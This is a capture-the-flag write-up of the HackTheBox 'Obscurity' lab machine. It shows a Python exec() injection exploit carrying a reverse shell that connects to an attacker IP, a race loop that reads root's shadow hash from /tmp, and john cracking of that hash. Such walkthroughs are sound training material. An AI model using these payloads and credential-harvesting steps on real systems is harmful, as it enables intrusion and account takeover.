---
date: 2020-05-09 23:48:05
layout: post
title: HackTheBox Obscurity Writeup
subtitle: Hackthebox Obscurity Writeup.
description: >-
  in this blog i've explained how to solve openadmin machine in hackthebox
image: https://i.ibb.co/bLSX2d2/obs.png
optimized_image: https://i.ibb.co/bLSX2d2/obs.png
category: hackthebox
tags:
  - hackthebox
  - Obscurity
author: Ahmed Fatouh
paginate: true
---



# []()Methodology:

* Enumeration 
* code analysis to get a reverse shell
* cracking
* got Robert Password
* privilege escalation



# []()Nmap Scan:

* from the Nmap scan, I find that Port 80 is closed but Port 8080 is opened, and here's Nmap scan.

```ruby

nmap -sC -sV -oN scan.txt 10.10.10.168
Host is up (0.14s latency).
Not shown: 996 filtered ports
PORT     STATE  SERVICE    VERSION
22/tcp   open   ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
80/tcp   closed http
8080/tcp open   http-proxy BadHTTPServer
| fingerprint-strings: 
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 200 OK
|     Date: Thu, 07 May 2020 22:59:25
|     Server: BadHTTPServer
|     Last-Modified: Thu, 07 May 2020 22:59:25
|     Content-Length: 4171
|     Content-Type: text/html
|     Connection: Closed
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>0bscura</title>
|     <meta http-equiv="X-UA-Compatible" content="IE=Edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1">
|     <meta name="keywords" content="">
|     <meta name="description" content="">
|     <!-- 
|     Easy Profile Template
|     http://www.templatemo.com/tm-467-easy-profile
|     <!-- stylesheet css -->
|     <link rel="stylesheet" href="css/bootstrap.min.css">
|     <link rel="stylesheet" href="css/font-awesome.min.css">
|     <link rel="stylesheet" href="css/templatemo-blue.css">
|     </head>
|     <body data-spy="scroll" data-target=".navbar-collapse">
|     <!-- preloader section -->
|     <!--
|     <div class="preloader">
|_    <div class="sk-spinner sk-spinner-wordpress">
|_http-server-header: BadHTTPServer
|_http-title: 0bscura
9000/tcp closed cslistener
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port8080-TCP:V=7.80%I=7%D=5/8%Time=5EB4E65B%P=x86_64-pc-linux-gnu%r(Get
SF:Request,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20Thu,\x2007\x20May\x20202
SF:0\x2022:59:25\nServer:\x20BadHTTPServer\nLast-Modified:\x20Thu,\x2007\x
SF:20May\x202020\x2022:59:25\nContent-Length:\x204171\nContent-Type:\x20te
SF:xt/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20html>\n<html\x20lang=\"e
SF:n\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<title>0bscura</title>\n
SF:\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=Edge\">\n\t<m
SF:eta\x20name=\"viewport\"\x20content=\"width=device-width,\x20initial-sc
SF:ale=1\">\n\t<meta\x20name=\"keywords\"\x20content=\"\">\n\t<meta\x20nam
SF:e=\"description\"\x20content=\"\">\n<!--\x20\nEasy\x20Profile\x20Templa
SF:te\nhttp://www\.templatemo\.com/tm-467-easy-profile\n-->\n\t<!--\x20sty
SF:lesheet\x20css\x20-->\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/boot
SF:strap\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/font-aw
SF:esome\.min\.css\">\n\t<link\x20rel=\"stylesheet\"\x20href=\"css/templat
SF:emo-blue\.css\">\n</head>\n<body\x20data-spy=\"scroll\"\x20data-target=
SF:\"\.navbar-collapse\">\n\n<!--\x20preloader\x20section\x20-->\n<!--\n<d
SF:iv\x20class=\"preloader\">\n\t<div\x20class=\"sk-spinner\x20sk-spinner-
SF:wordpress\">\n")%r(HTTPOptions,10FC,"HTTP/1\.1\x20200\x20OK\nDate:\x20T
SF:hu,\x2007\x20May\x202020\x2022:59:25\nServer:\x20BadHTTPServer\nLast-Mo
SF:dified:\x20Thu,\x2007\x20May\x202020\x2022:59:25\nContent-Length:\x2041
SF:71\nContent-Type:\x20text/html\nConnection:\x20Closed\n\n<!DOCTYPE\x20h
SF:tml>\n<html\x20lang=\"en\">\n<head>\n\t<meta\x20charset=\"utf-8\">\n\t<
SF:title>0bscura</title>\n\t<meta\x20http-equiv=\"X-UA-Compatible\"\x20con
SF:tent=\"IE=Edge\">\n\t<meta\x20name=\"viewport\"\x20content=\"width=devi
SF:ce-width,\x20initial-scale=1\">\n\t<meta\x20name=\"keywords\"\x20conten
SF:t=\"\">\n\t<meta\x20name=\"description\"\x20content=\"\">\n<!--\x20\nEa
SF:sy\x20Profile\x20Template\nhttp://www\.templatemo\.com/tm-467-easy-prof
SF:ile\n-->\n\t<!--\x20stylesheet\x20css\x20-->\n\t<link\x20rel=\"styleshe
SF:et\"\x20href=\"css/bootstrap\.min\.css\">\n\t<link\x20rel=\"stylesheet\
SF:"\x20href=\"css/font-awesome\.min\.css\">\n\t<link\x20rel=\"stylesheet\
SF:"\x20href=\"css/templatemo-blue\.css\">\n</head>\n<body\x20data-spy=\"s
SF:croll\"\x20data-target=\"\.navbar-collapse\">\n\n<!--\x20preloader\x20s
SF:ection\x20-->\n<!--\n<div\x20class=\"preloader\">\n\t<div\x20class=\"sk
SF:-spinner\x20sk-spinner-wordpress\">\n");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

# []()Checking The Web Page@Port-8080:

*  from the Nmap scan, I found that the port 8080 is opened so let's check it.

![](https://i.ibb.co/cvF0TCt/checkingwebpage.png)

* in this section from the web page we know that the source code of the web server in pythonscript Called 'SuperSecureServer.py' let's open it.

![](https://i.ibb.co/zxLrQWh/404.png)

* I didn't get anything so now let's Bruteforce the directories.

* I will use **WFUZZ** in this step.

![](https://i.ibb.co/rMmbGYz/wfuzz.png)

```ruby
wfuzz -c --hc 404 -z file,'/usr/share/dirb/wordlists/big.txt' http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
********************************************************
* Wfuzz 2.4.5 - The Web Fuzzer                         *
********************************************************

Target: http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
Total requests: 20469

===================================================================
ID           Response   Lines    Word     Chars       Payload                                                                                                 
===================================================================

000006016:   200        170 L    498 W    5892 Ch     "develop"                                                                                               
000006146:   404        6 L      14 W     181 Ch      "discountmail"                                                                                          

```
* now we got the webserver directory, let's download the script to our machine and analyze it

```ruby
wget -c http://10.10.10.168:8080/develop/SuperSecureServer.py
--2020-05-08 15:36:05--  http://10.10.10.168:8080/develop/SuperSecureServer.py
Connecting to 10.10.10.168:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 5892 (5.8K) [text/plain]
Saving to: ‘SuperSecureServer.py’

SuperSecureServer.py                       100%[=====================================================================================>]   5.75K  --.-KB/s    in 0.09s   

2020-05-08 15:36:06 (63.8 KB/s) - ‘SuperSecureServer.py’ saved [5892/5892]

```

# []()Reverse-Shell@www-data:

* after downloaded the webserver script and analyzed it I've found that i have to write a python script to get a reverse shell.

### []()Code Analysis Part:

* Lets open the code and check it.

* **The Python Script :** 

```ruby

import socket
import threading
from datetime import datetime
import sys
import os
import mimetypes
import urllib.parse
import subprocess

respTemplate = """HTTP/1.1 {statusNum} {statusCode}
Date: {dateSent}
Server: {server}
Last-Modified: {modified}
Content-Length: {length}
Content-Type: {contentType}
Connection: {connectionType}

{body}
"""
DOC_ROOT = "DocRoot"

CODES = {"200": "OK", 
        "304": "NOT MODIFIED",
        "400": "BAD REQUEST", "401": "UNAUTHORIZED", "403": "FORBIDDEN", "404": "NOT FOUND", 
        "500": "INTERNAL SERVER ERROR"}

MIMES = {"txt": "text/plain", "css":"text/css", "html":"text/html", "png": "image/png", "jpg":"image/jpg", 
        "ttf":"application/octet-stream","otf":"application/octet-stream", "woff":"font/woff", "woff2": "font/woff2", 
        "js":"application/javascript","gz":"application/zip", "py":"text/plain", "map": "application/octet-stream"}


class Response:
    def __init__(self, **kwargs):
        self.__dict__.update(kwargs)
        now = datetime.now()
        self.dateSent = self.modified = now.strftime("%a, %d %b %Y %H:%M:%S")
    def stringResponse(self):
        return respTemplate.format(**self.__dict__)

class Request:
    def __init__(self, request):
        self.good = True
        try:
            request = self.parseRequest(request)
            self.method = request["method"]
            self.doc = request["doc"]
            self.vers = request["vers"]
            self.header = request["header"]
            self.body = request["body"]
        except:
            self.good = False

    def parseRequest(self, request):        
        req = request.strip("\r").split("\n")
        method,doc,vers = req[0].split(" ")
        header = req[1:-3]
        body = req[-1]
        headerDict = {}
        for param in header:
            pos = param.find(": ")
            key, val = param[:pos], param[pos+2:]
            headerDict.update({key: val})
        return {"method": method, "doc": doc, "vers": vers, "header": headerDict, "body": body}


class Server:
    def __init__(self, host, port):    
        self.host = host
        self.port = port
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.sock.bind((self.host, self.port))

    def listen(self):
        self.sock.listen(5)
        while True:
            client, address = self.sock.accept()
            client.settimeout(60)
            threading.Thread(target = self.listenToClient,args = (client,address)).start()

    def listenToClient(self, client, address):
        size = 1024
        while True:
            try:
                data = client.recv(size)
                if data:
                    # Set the response to echo back the recieved data 
                    req = Request(data.decode())
                    self.handleRequest(req, client, address)
                    client.shutdown()
                    client.close()
                else:
                    raise error('Client disconnected')
            except:
                client.close()
                return False
    
    def handleRequest(self, request, conn, address):
        if request.good:
#            try:
                # print(str(request.method) + " " + str(request.doc), end=' ')
                # print("from {0}".format(address[0]))
#            except Exception as e:
#                print(e)
            document = self.serveDoc(request.doc, DOC_ROOT)
            statusNum=document["status"]
        else:
            document = self.serveDoc("/errors/400.html", DOC_ROOT)
            statusNum="400"
        body = document["body"]
        
        statusCode=CODES[statusNum]
        dateSent = ""
        server = "BadHTTPServer"
        modified = ""
        length = len(body)
        contentType = document["mime"] # Try and identify MIME type from string
        connectionType = "Closed"


        resp = Response(
        statusNum=statusNum, statusCode=statusCode, 
        dateSent = dateSent, server = server, 
        modified = modified, length = length, 
        contentType = contentType, connectionType = connectionType, 
        body = body
        )

        data = resp.stringResponse()
        if not data:
            return -1
        conn.send(data.encode())
        return 0

    def serveDoc(self, path, docRoot):
        path = urllib.parse.unquote(path)
        try:
            info = "output = 'Document: {}'" # Keep the output for later debug
            exec(info.format(path)) # This is how you do string formatting, right?
            cwd = os.path.dirname(os.path.realpath(__file__))
            docRoot = os.path.join(cwd, docRoot)
            if path == "/":
                path = "/index.html"
            requested = os.path.join(docRoot, path[1:])
            if os.path.isfile(requested):
                mime = mimetypes.guess_type(requested)
                mime = (mime if mime[0] != None else "text/html")
                mime = MIMES[requested.split(".")[-1]]
                try:
                    with open(requested, "r") as f:
                        data = f.read()
                except:
                    with open(requested, "rb") as f:
                        data = f.read()
                status = "200"
            else:
                errorPage = os.path.join(docRoot, "errors", "404.html")
                mime = "text/html"
                with open(errorPage, "r") as f:
                    data = f.read().format(path)
                status = "404"
        except Exception as e:
            print(e)
            errorPage = os.path.join(docRoot, "errors", "500.html")
            mime = "text/html"
            with open(errorPage, "r") as f:
                data = f.read()
            status = "500"
        return {"body": data, "mime": mime, "status": status}



```

![](https://i.ibb.co/r3dWhJG/code-part.png)

* After reviewing the script for a while and getting some tips over the HTB forum , i understand that the line **exec(info.format(path))** This is how you do string formating , okey! this is vulnerable to command injection. This line which passes tha path whatever the request goes to the exec function like **PYTHONPATH Hijacking**. Let's exploit this script by executing my reverse shell.

* python reverse shell:

```ruby

import requests
import urllib
import os

url = 'http://10.10.10.168:8080/'

path='5\''+'\nimport socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.xx.xx",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1>

payload = urllib.parse.quote(path)
print("payload")
print(url+payload)

r= requests.get(url+payload)
print(r.headers)
print(r.text)

```

* **reverse shell**:

![](https://i.ibb.co/1LWF3CY/wwwreversshell.png)

# []()Privilege Escalation --->> Robert:

* open the home directory to >> **robert** >> you will find some interesting files.

![](https://i.ibb.co/k1RkfJV/robert-home.png)

* cat **check.txt** 

```ruby

Encrypting this file with your key should result in out.txt, make sure your key is correct!

```

* so check.txt is the original text file of out.txt. using the check.txt as key the output came as out.txt file 

* from the source code of the python script i found that we will use it to decrypt the "out.txt" file

![](https://i.ibb.co/PYvvbHG/out.png)

* we will use this command to decrypt the out file.

* the output will be the key that we will use it to decrypt the "passwordreminder.txt" --> Robert Password.

```ruby

python3 SuperSecureCrypt.py -i out.txt -o /tmp/mine -k "$(cat check.txt)" -d
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file out.txt...
Decrypting...
Writing to /tmp/mine...

```
* Let's show the output now.

![](https://i.ibb.co/kXhHGSD/key.png)

* Key = **alexandrovich**

* Robert Password :

```ruby

python3 SuperSecureCrypt.py -i passwordreminder.txt -o /tmp/robert -k alexandrovich -d
################################
#           BEGINNING          #
#    SUPER SECURE ENCRYPTOR    #
################################
  ############################
  #        FILE MODE         #
  ############################
Opening file passwordreminder.txt...
Decrypting...
Writing to /tmp/robert...
```

![](https://i.ibb.co/2Sgjz18/robertpasss.png)

* Rober Password = **SecThruObsFTW**

* SSH Login@**Robert**:

![](https://i.ibb.co/gWC3sFV/robertssh.png)

* **User Flag** :

![](https://i.ibb.co/5F4T0Jj/user.png)

# []()Privilege Escalation -->> Root:

* first thing type **sudo -l** :

![](https://i.ibb.co/7gdXGHt/sudo.png)

* let's see the source code of **BetterSSH.py** and use it to know what we should do.

* the BtterSSH.py read the content of /etc/shadow and write it to /tmp/SSH.

![](https://i.ibb.co/31td7W0/bettererrror.png)

* interesting Lines at the source code :

```ruby 

    passwordFile = '\n'.join(['\n'.join(p) for p in passwords]) 
    with open('/tmp/SSH/'+path, 'w') as f:
        f.write(passwordFile)
    time.sleep(.1)
    salt = ""
    realPass = ""
    for p in passwords:
        if p[0] == session['user']:
            salt, realPass = p[1].split('$')[2:]
            break

    if salt == "":
        print("Invalid user")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    salt = '$6$'+salt+'$'
    realPass = salt + realPass

    hash = crypt.crypt(passW, salt)

    if hash == realPass:
        print("Authed!")
        session['authenticated'] = 1
    else:
        print("Incorrect pass")
        os.remove('/tmp/SSH/'+path)
        sys.exit(0)
    os.remove(os.path.join('/tmp/SSH/',path))
except Exception as e:
    traceback.print_exc()
    sys.exit(0)

if session['authenticated'] == 1:
```

* from this code we know that if we successfully logged in the password hash will be popup in "/tmp/SSH/" so let's capture the password.

* open another SSH session and make a SSH dir in /tmp.

* run this command **whild sleep 0.1;do cat /tmp/SSH/* 2>/dev/null;done**

* then run this command **/usr/bin/sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py**

* bingo! we got the root hash.

![](https://i.ibb.co/B4nS23N/roothash.png)

* Let's crack it :

```ruby

sudo john -w=rockyou.txt root.hash

Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
mercedes         (?)
1g 0:00:00:00 DONE (2020-05-08 18:12) 1.818g/s 930.9p/s 930.9c/s 930.9C/s angelo..letmein
Use the "--show" option to display all of the cracked passwords reliably
Session completed

```

![](https://i.ibb.co/d5SnZqm/passwordroot.png)

* **Root** Password --> **mercedes**.

* run this command --> su root and type the root password.

![](https://i.ibb.co/MCdH3WN/finaly.png)

* If you like this write up and want to support me to do more writeups buy me a coffe >> [https://www.buymeacoffee.com/XDev05]()

* **Refrence** : [https://www.w3schools.com/python/ref_func_exec.asp]()

**Thanks**

 <script src="https://www.hackthebox.eu/badge/103789"></script>
 






